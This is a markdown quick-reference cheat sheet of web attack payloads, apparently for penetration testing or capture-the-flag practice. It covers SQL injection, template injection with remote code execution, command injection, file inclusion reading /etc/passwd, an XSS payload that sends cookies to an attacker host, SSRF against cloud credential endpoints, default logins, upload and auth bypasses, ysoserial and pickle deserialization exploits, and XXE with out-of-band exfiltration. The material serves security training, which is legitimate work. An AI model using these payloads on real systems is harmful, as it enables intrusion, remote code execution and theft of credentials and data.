# Attack Vectors Quick Reference

## Table of Contents
1. [SQL Injection](#sql-injection)
2. [Server-Side Template Injection (SSTI)](#ssti)
3. [Command Injection](#command-injection)
4. [Local File Inclusion (LFI)](#lfi)
5. [Cross-Site Scripting (XSS)](#xss)
6. [Server-Side Request Forgery (SSRF)](#ssrf)
7. [Authentication Bypass](#authentication-bypass)
8. [File Upload](#file-upload)
9. [Deserialization](#deserialization)
10. [XML External Entity (XXE)](#xxe)

---

## SQL Injection

**Detection:** Input `'` and observe error messages.

```
# Basic tests
' OR 1=1--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# Column count detection
' ORDER BY 1-- (increment until error)

# Data extraction
' UNION SELECT username,password FROM users--

# Blind SQLi (boolean)
' AND 1=1-- (true)
' AND 1=2-- (false)

# Time-based blind
' AND SLEEP(5)--           (MySQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
' AND pg_sleep(5)--        (PostgreSQL)
```

**Tools:** `sqlmap -u "http://<TARGET>/page?id=1" --dbs`

---

## SSTI

**Detection:** Input `{{7*7}}` — if output shows `49`, it's vulnerable.

```
# Jinja2 (Python/Flask)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
# RCE:
{{''.__class__.__mro__[1].__subclasses__()[<N>]('id',shell=True,stdout=-1).communicate()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Handlebars (Node.js)
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}{{/with}}
```

**Key insight for Java devs:** SSTI is like uncontrolled JSP EL expression
evaluation — the template engine interprets user input as code.

---

## Command Injection

**Detection:** Input `;id` or `|id` in any parameter that might reach a shell.

```
# Separators to try
; id
| id
|| id
& id
&& id
$(id)
`id`

# Blind detection
; sleep 5
| sleep 5

# Newline injection
%0aid
```

**Key insight:** Any application feature that calls external commands
(ping, DNS lookup, file conversion, PDF generation) is a candidate.

---

## LFI

**Detection:** Parameters like `?page=`, `?file=`, `?template=`, `?include=`

```
# Path traversal
../../../etc/passwd
....//....//....//etc/passwd  (bypasses basic ../ filter)

# PHP wrappers
php://filter/convert.base64-encode/resource=config
php://input (POST body becomes file content)
data://text/plain,<?php system('id'); ?>

# Log poisoning
/var/log/apache2/access.log  (inject PHP via User-Agent header first)

# Null byte (PHP < 5.3)
../../../etc/passwd%00
```

---

## XSS

```
# Basic tests
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

# Cookie theft
<script>new Image().src="http://<attacker>/steal?c="+document.cookie</script>

# DOM-based
javascript:alert(1)
```

---

## SSRF

**Detection:** Any feature that fetches URLs (image preview, URL import, webhook).

```
# Internal services
http://127.0.0.1:80
http://localhost:8080
http://169.254.169.254/latest/meta-data/  (AWS metadata)

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
```

---

## Authentication Bypass

```
# Default credentials (always try first)
admin:admin, admin:password, root:root, admin:admin123

# JWT attacks (see tech-specific.md)

# SQL injection in login
Username: admin'--
Password: anything

# HTTP verb tampering
GET /admin → 403
POST /admin → 200?

# Path traversal in auth
/admin → 403
/Admin → 200?
/ADMIN → 200?
/%61dmin → 200?
/admin/ → 200?
/admin;/ → 200?
```

---

## File Upload

```
# Extension bypasses
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
shell.php.

# Content-type bypass
Change Content-Type to image/jpeg while uploading .php

# Magic bytes
Add GIF89a; before PHP code

# Double extension
shell.jpg.php (if server checks first extension)
```

---

## Deserialization

**Java:** Use ysoserial to generate payloads
```bash
java -jar ysoserial.jar CommonsCollections1 'id' | base64
```

**PHP:** Manipulate serialized objects
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
```

**Python:** Pickle RCE
```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())
```

---

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE with OOB -->
<!ENTITY % xxe SYSTEM "http://<attacker>/collect">
```
